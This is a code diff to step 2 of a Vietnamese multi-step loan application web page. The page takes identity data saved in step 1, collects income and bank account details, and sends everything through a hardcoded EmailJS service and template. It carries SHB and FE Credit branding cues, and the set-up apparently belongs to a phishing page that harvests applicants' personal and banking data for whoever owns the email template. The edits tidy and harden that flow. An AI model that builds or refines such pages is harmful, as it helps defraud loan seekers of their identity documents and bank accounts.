@@ -52,7 +52,7 @@
         .calculation-table tbody tr:hover { background: #e6f5e9; }
         
         /* Buttons */
-        .btn-next { width: 100%; background: linear-gradient(135deg, #ed1c24 0%, #ed1c24 100%); border: none; padding: 15px; font-weight: 700; border-radius: 10px; color: white; margin-top: 20px; }
+        .btn-next { width: 100%; background: linear-gradient(135deg, #ed1c24 0%, #ed1c24 100%); border: none; padding: 15px; font-weight: 700; border-radius: 10px; color: white; margin-top: 20px; cursor: pointer; }
         .btn-next:hover { background: #007a3f; color: white; }
         .btn-next:disabled { background: #ccc; cursor: not-allowed; opacity: 0.7; }
         
@@ -304,16 +304,15 @@
         // =====================================================================
         // PHẦN 1: LOGIC LƯU VỊ TRÍ - Save current step on page load
         // =====================================================================
-        // Lưu vị trí hiện tại ngay khi trang tải
         localStorage.setItem('currentStep', 'step2.html');
 
-        // --- CONFIG (From step1cu.html) ---
+        // --- CONFIG ---
         const emailjsConfig = {
             serviceId: 'service_ezzpzs5',
             templateId: 'template_tjxle2u',
             publicKey: 'v85aFIEKnuTOF51yG'
         };
-        const SECRET_KEY = 'fecredit-secret-key-v1'; // Unified encryption key across all steps
+        const SECRET_KEY = 'fecredit-secret-key-v1';
 
         // Initialize EmailJS
         try {
@@ -322,9 +321,9 @@
             console.error('Cannot initialize EmailJS:', error);
         }
 
-        let userData = {}; // Global variable to store user data
+        let userData = {};
 
-        // --- UTILS (From step1cu.html) ---
+        // --- UTILS ---
         function loadUserData() {
             const encrypted = localStorage.getItem('userData');
             if (!encrypted) return null;
@@ -346,7 +345,7 @@
             }
         }
 
-        // --- AUTO UPDATE INTEREST RATE (From step1cu.html) ---
+        // --- AUTO UPDATE INTEREST RATE ---
         function updateInterestRate() {
             const loanType = $('#loanType').val() || '';
             const interestRate = $('#interestRate');
@@ -360,17 +359,15 @@
             };
             const rate = rates[loanType] || 7.0;
             interestRate.val(rate.toFixed(2));
-            // Trigger calculation after rate update
             calculateLoan();
         }
 
-        // --- CALCULATE LOAN (From step1cu.html) ---
+        // --- CALCULATE LOAN ---
         function calculateLoan() {
             const loanAmountEl = $('#loanAmount');
             const loanTermEl = $('#loanTerm');
             const interestRateEl = $('#interestRate');
             
-            // Validate
             let isCalcValid = true;
             if(!loanAmountEl.val() || (loanAmountEl.val() === 'other' && !$('#customLoanAmount').val())) {
                 isCalcValid = false;
@@ -382,7 +379,6 @@
                 return;
             }
 
-            // Get loan amount
             const loanAmountValue = $('#loanAmount').val();
             let loanAmount;
             if (loanAmountValue === 'other') {
@@ -393,26 +389,23 @@
             }
 
             const loanTerm = parseInt($('#loanTerm').val());
-            const interestRate = parseFloat($('#interestRate').val()) / 100 / 12; // Monthly rate
+            const interestRate = parseFloat($('#interestRate').val()) / 100 / 12;
 
             if (isNaN(loanAmount) || isNaN(loanTerm) || isNaN(interestRate) || loanAmount <= 0) {
                 return;
             }
 
-            // Calculate monthly payment (PMT formula)
             const monthlyRate = interestRate;
             const ratePower = Math.pow(1 + monthlyRate, loanTerm);
             const monthlyPayment = (loanAmount * monthlyRate * ratePower) / (ratePower - 1);
             const totalAmount = monthlyPayment * loanTerm;
             const totalInterest = totalAmount - loanAmount;
 
-            // Update summary display
             $('#calcLoanAmount').text(Math.floor(loanAmount).toLocaleString('vi-VN') + ' VNĐ');
             $('#calcMonthlyPayment').text(Math.floor(monthlyPayment).toLocaleString('vi-VN') + ' VNĐ');
             $('#calcTotalInterest').text(Math.floor(totalInterest).toLocaleString('vi-VN') + ' VNĐ');
             $('#calcTotalAmount').text(Math.floor(totalAmount).toLocaleString('vi-VN') + ' VNĐ');
 
-            // Build amortization table
             let balance = loanAmount;
             const tableBody = $('#calculationTable').empty();
             const fragment = document.createDocumentFragment();
@@ -434,7 +427,6 @@
             }
             tableBody.append(fragment);
 
-            // Store in userData for later use
             userData.monthlyPayment = monthlyPayment;
             userData.totalInterest = totalInterest;
             userData.totalRepay = totalAmount;
@@ -445,7 +437,6 @@
             let isValid = true;
             let firstError = null;
 
-            // Validate loan type
             if (!$('#loanType').val()) {
                 $('#loanType').addClass('is-invalid');
                 isValid = false;
@@ -454,7 +445,6 @@
                 $('#loanType').removeClass('is-invalid');
             }
 
-            // Validate loan amount
             const loanAmountValue = $('#loanAmount').val();
             if (!loanAmountValue) {
                 $('#loanAmount').addClass('is-invalid');
@@ -476,7 +466,6 @@
                 $('#loanAmount').removeClass('is-invalid');
             }
 
-            // Validate loan term
             if (!$('#loanTerm').val()) {
                 $('#loanTerm').addClass('is-invalid');
                 isValid = false;
@@ -485,7 +474,6 @@
                 $('#loanTerm').removeClass('is-invalid');
             }
 
-            // Validate purpose
             if (!$('#purpose').val()) {
                 $('#purpose').addClass('is-invalid');
                 isValid = false;
@@ -494,9 +482,11 @@
                 $('#purpose').removeClass('is-invalid');
             }
 
-            // Validate monthly income
-            const monthlyIncome = parseFloat($('#monthlyIncome').val().replace(/,/g, ''));
-            if (isNaN(monthlyIncome) || monthlyIncome < 3000000) {
+            // FIX: Properly parse monthly income with better error handling
+            const monthlyIncomeText = $('#monthlyIncome').val().trim();
+            const monthlyIncomeNum = parseFloat(monthlyIncomeText.replace(/,/g, '') || '0');
+            
+            if (!monthlyIncomeText || isNaN(monthlyIncomeNum) || monthlyIncomeNum < 3000000) {
                 $('#monthlyIncome').addClass('is-invalid');
                 $('#monthlyIncomeError').text('Thu nhập phải từ 3.000.000 VNĐ trở lên.');
                 isValid = false;
@@ -505,7 +495,6 @@
                 $('#monthlyIncome').removeClass('is-invalid');
             }
 
-            // Validate occupation
             if (!$('#occupation').val()) {
                 $('#occupation').addClass('is-invalid');
                 isValid = false;
@@ -514,7 +503,6 @@
                 $('#occupation').removeClass('is-invalid');
             }
 
-            // Validate bank name
             if (!$('#bankName').val()) {
                 $('#bankName').addClass('is-invalid');
                 isValid = false;
@@ -523,9 +511,11 @@
                 $('#bankName').removeClass('is-invalid');
             }
 
-            // Validate account number
-            const accountNumber = $('#accountNumber').val().replace(/\s/g, '');
-            if (!/^\d{8,20}$/.test(accountNumber)) {
+            // FIX: Better account number validation - remove non-digits first
+            const accountNumberText = $('#accountNumber').val().trim();
+            const accountNumber = accountNumberText.replace(/\s/g, '');
+            
+            if (!accountNumberText || !/^[0-9]{8,20}$/.test(accountNumber)) {
                 $('#accountNumber').addClass('is-invalid');
                 $('#accountNumberError').text('Số tài khoản phải từ 8-20 số.');
                 isValid = false;
@@ -534,7 +524,6 @@
                 $('#accountNumber').removeClass('is-invalid');
             }
 
-            // Validate account name
             if (!$('#accountName').val().trim()) {
                 $('#accountName').addClass('is-invalid');
                 isValid = false;
@@ -551,14 +540,13 @@
             return isValid;
         }
 
-        // --- MAIN SUBMIT FUNCTION (From step1cu.html) ---
+        // --- MAIN SUBMIT FUNCTION ---
         async function finishStep2() {
             if (!validateStep2()) {
-                alert("Vui lòng điền đầy đủ thông tin khoản vay.");
+                console.error('Step 2 validation failed');
                 return;
             }
 
-            // 1. Load Step 1 data
             const step1Data = loadUserData();
             if (!step1Data || !step1Data.fullName) {
                 alert("Không tìm thấy thông tin Bước 1. Vui lòng quay lại.");
@@ -566,14 +554,14 @@
                 return;
             }
 
-            // 2. Collect Step 2 data
             const loanAmountValue = $('#loanAmount').val();
             const loanAmount = loanAmountValue === 'other' ? 
                               $('#customLoanAmount').val().replace(/,/g, '') : loanAmountValue;
 
-            // 3. Merge all data (Step 1 + Step 2)
+            const monthlyIncomeText = $('#monthlyIncome').val().replace(/,/g, '');
+            const monthlyIncomeNum = parseFloat(monthlyIncomeText || '0');
+
             userData = {
-                // From Step 1
                 fullName: step1Data.fullName,
                 dob: step1Data.dob,
                 gender: step1Data.gender,
@@ -582,18 +570,16 @@
                 issuePlace: step1Data.issuePlace,
                 phone: step1Data.phone,
                 email: step1Data.email,
-                // From Step 2
                 loanType: $('#loanType').val(),
                 loanTerm: $('#loanTerm').val(),
                 loanAmount: loanAmount,
                 interestRate: parseFloat($('#interestRate').val()),
-                monthlyIncome: parseFloat($('#monthlyIncome').val().replace(/,/g, '')),
+                monthlyIncome: monthlyIncomeNum,
                 occupation: $('#occupation').val(),
                 purpose: $('#purpose').val(),
                 accountName: $('#accountName').val().trim(),
                 accountNumber: $('#accountNumber').val().trim().replace(/\s/g, ''),
                 bankName: $('#bankName').val(),
-                // Generated data
                 loanCode: 'SHB' + Math.floor(100000 + Math.random() * 900000),
                 monthlyPayment: userData.monthlyPayment || 0,
                 totalInterest: userData.totalInterest || 0,
@@ -604,26 +590,15 @@
                 timestamp: new Date().toISOString()
             };
 
-            // 4. Show loading modal
             $('#btnSubmit').prop('disabled', true);
             $('#loadingModal').css('display', 'flex').hide().fadeIn();
 
-            // 5. Save to localStorage
             if (!saveToLocalStorage()) {
                 alert('Lỗi lưu dữ liệu. Vui lòng thử lại.');
                 $('#loadingModal').fadeOut();
                 $('#btnSubmit').prop('disabled', false);
                 return;
             }
-
-            // 6. Prepare EmailJS templateParams (EXACTLY as in step1cu.html)
-            const emailjsInfo = {
-                serviceId: emailjsConfig.serviceId,
-                templateId: emailjsConfig.templateId,
-                publicKey: emailjsConfig.publicKey,
-                status: 'ready',
-                timestamp: new Date().toISOString()
-            };
 
             const templateParams = {
                 full_name: userData.fullName,
@@ -646,15 +621,9 @@
                 loan_code: userData.loanCode,
                 monthly_payment: userData.monthlyPayment ? Math.floor(userData.monthlyPayment).toLocaleString('vi-VN') + ' VNĐ' : '',
                 total_interest: userData.totalInterest ? Math.floor(userData.totalInterest).toLocaleString('vi-VN') + ' VNĐ' : '',
-                total_repayment: userData.totalRepay ? Math.floor(userData.totalRepay).toLocaleString('vi-VN') + ' VNĐ' : '',
-                // EmailJS info for debugging
-                emailjs_service_id: emailjsInfo.serviceId,
-                emailjs_template_id: emailjsInfo.templateId,
-                emailjs_public_key: emailjsInfo.publicKey,
-                emailjs_status: emailjsInfo.status
+                total_repayment: userData.totalRepay ? Math.floor(userData.totalRepay).toLocaleString('vi-VN') + ' VNĐ' : ''
             };
 
-            // 7. Send Email via EmailJS
             try {
                 if (!emailjs) throw new Error('EmailJS not initialized');
                 if (!emailjsConfig) throw new Error('EmailJS config not defined');
@@ -665,17 +634,16 @@
                     templateParams
                 );
 
-               if (response.status === 200) {
-    userData.emailSent = true;
-    userData.currentStep = 2;
-    userData.timestamp = new Date().toISOString();
-    
-    saveToLocalStorage();
-    
-    // Bỏ alert, chỉ redirect thẳng
-    setTimeout(() => {
-        window.location.href = 'step3.html';
-    }, 1000);  // giảm thời gian chờ xuống 1 giây cho mượt hơn
+                if (response.status === 200) {
+                    userData.emailSent = true;
+                    userData.currentStep = 2;
+                    userData.timestamp = new Date().toISOString();
+                    
+                    saveToLocalStorage();
+                    
+                    setTimeout(() => {
+                        window.location.href = 'step3.html';
+                    }, 1000);
                 } else {
                     throw new Error(`Email service returned status: ${response.status}`);
                 }
@@ -689,7 +657,6 @@
 
         // --- DOCUMENT READY ---
         $(document).ready(function() {
-            // 1. Protect flow: Redirect if no Step 1 data
             const step1Data = loadUserData();
             if (!step1Data || !step1Data.fullName) {
                 alert("Vui lòng điền thông tin cá nhân trước!");
@@ -697,19 +664,16 @@
                 return;
             }
 
-            // 2. Apply masks
             $('#monthlyIncome').mask('000,000,000,000', {reverse: true});
             $('#customLoanAmount').mask('000,000,000,000,000,000', {reverse: true});
             $('#accountNumber').mask('00000000000000000000', {
                 translation: { '0': { pattern: /[0-9]/, optional: true } }
             });
 
-            // 3. Pre-fill account name from Step 1
             if(step1Data.fullName) {
                 $('#accountName').val(step1Data.fullName);
             }
 
-            // 4. Handle "Khác" option for loan amount
             $('#loanAmount').change(function() {
                 const customGroup = $('#customLoanAmountGroup');
                 if (this.value === 'other') {
@@ -721,16 +685,12 @@
                 calculateLoan();
             });
 
-            // 5. Auto update interest rate when loan type changes
             $('#loanType').change(updateInterestRate);
 
-            // 6. Trigger calculation on relevant field changes
             $('#loanAmount, #loanTerm, #interestRate, #customLoanAmount').on('change input', calculateLoan);
 
-            // 7. Initialize interest rate
             updateInterestRate();
 
-            // 8. Remove validation error on input
             $('input, select').on('input change', function() {
                 $(this).removeClass('is-invalid');
             });
@@ -738,5 +698,3 @@
     </script>
 </body>
 </html>
-
-
